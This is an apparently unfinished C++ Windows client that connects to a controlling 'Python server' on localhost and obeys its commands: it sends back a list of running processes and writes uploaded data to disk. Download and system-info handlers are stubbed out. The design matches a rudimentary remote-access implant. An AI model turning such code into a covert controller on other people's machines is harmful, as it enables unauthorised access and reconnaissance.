#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <sal.h>
#include <fstream>

#pragma comment (lib, "ws2_32.lib")

using namespace std;

string get_proc_info(DWORD processID) {
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
	string procName;

	// Get a handle to the process.

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);
	// Get the process name.

	if (NULL != hProcess)
	{
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
			&cbNeeded))
		{
			GetModuleBaseName(hProcess, hMod, szProcessName,
				sizeof(szProcessName) / sizeof(TCHAR));
		}
	}

	#ifndef UNICODE
		procName = szProcessName;
	#else
		std::wstring wStr = szProcessName;
		procName = std::string(wStr.begin(), wStr.end());
	#endif

	string output = "PID: " + std::to_string(processID) + "| EXE: " + procName + "\n";

	// Release the handle to the process.

	CloseHandle(hProcess);

	return output;
}

string list_procs(SOCKET sock) {
	// Get the list of process identifiers.

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		return string("Error: Could not enumerate procs");
	}

	// Calculate how many process identifiers were returned.
	cProcesses = cbNeeded / sizeof(DWORD);

	// Set variable for output

	string output = "";

	// Print the name and process identifier for each process.

	for (i = 0; i < cProcesses; i++)
	{
		if (aProcesses[i] != 0)
		{
			output.append(get_proc_info(aProcesses[i]));
		}
	}

	return output;
}

BOOL upload_file(string file_contents) {
	fstream my_file;
	my_file.open("uploaded_file.txt", ios::out);
	if (!my_file) {
		return FALSE;
	} else {
		cout << "File created successfully!";
		my_file << file_contents;
		my_file.close();
		return TRUE;
	}
	return FALSE;
}

void main()
{
	string ipAddress = "127.0.0.1";			// IP Address of the server
	int port = 25565;						// Listening port # on the server

	// Initialze WinSock
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	int wsOk = WSAStartup(ver, &wsData);
	if (wsOk != 0)
	{
		cerr << "Can't Initialize winsock! Quitting" << endl;
		return;
	}

	// Create a socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		cerr << "Can't create a socket! Quitting" << endl;
		return;
	}

	// Bind the IP address and port to a socket
	sockaddr_in binder;
	binder.sin_family = AF_INET;
	binder.sin_port = htons(port);
	inet_pton(AF_INET, ipAddress.c_str(), &binder.sin_addr);

	int conn = connect(sock, (sockaddr*)&binder, sizeof(binder));
	if (conn == SOCKET_ERROR) {
		printf("Could not connect to server...\n");
		char buffer[256];
		snprintf(buffer, 256, "%d\n", WSAGetLastError());
		printf(buffer);
		closesocket(sock);
		WSACleanup();
		return;
	}
	
	cout << "Connected to Python server...\n";

	// Open loop to listen to requests from Python server...
	BOOL running = TRUE;
	while (running) {
		char buffer[4096];
		int bytesReceived = recv(sock, buffer, 4096, 0);
		if (bytesReceived > 0)
		{
			// Echo response to console
			string resp = string(buffer, 0, bytesReceived);
			if (resp == string("list_procs")) {
				string procs = list_procs(sock);
				_Post_ _Notnull_ char *proc_list = (char*)malloc(procs.size() + 1);
				memcpy(proc_list, procs.c_str(), procs.size() + 1);
				//proc_list = procs.c_str();
				send(sock, proc_list, strlen(proc_list), 0);
				free(proc_list);
			}
			if (resp == string("upload_file")) {
				char upload_buffer[4096];
				int uploadBytesReceived = recv(sock, upload_buffer, 4096, 0);
				if (bytesReceived > 0) {
					string upload_resp = string(upload_buffer, 0, uploadBytesReceived);
					BOOL result = upload_file(upload_resp);
					if (result) {
						string succ = "Success! File has been uploaded";
						cout << succ;
						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
						send(sock, succ_succ, strlen(succ_succ), 0);
						free(succ_succ);
					}
					else {
						string succ = "Failure! File has not been uploaded";
						cout << succ;
						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
						send(sock, succ_succ, strlen(succ_succ), 0);
						free(succ_succ);
					}
				} else {
					string succ = "Failure! File has not been uploaded";
					cout << succ;
					_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
					memcpy(succ_succ, succ.c_str(), succ.size() + 1);
					send(sock, succ_succ, strlen(succ_succ), 0);
					free(succ_succ);
				}
			}
			if (resp == string("download_file")) {

			}
			if (resp == string("sys_info")) {

			}
			if (resp == string("exit")) {
				running = FALSE;
			}
			cout << "SERVER> " << resp << endl;
		}
	}

	// Close the socket
	closesocket(sock);

	// Cleanup winsock
	WSACleanup();

	system("pause");
}
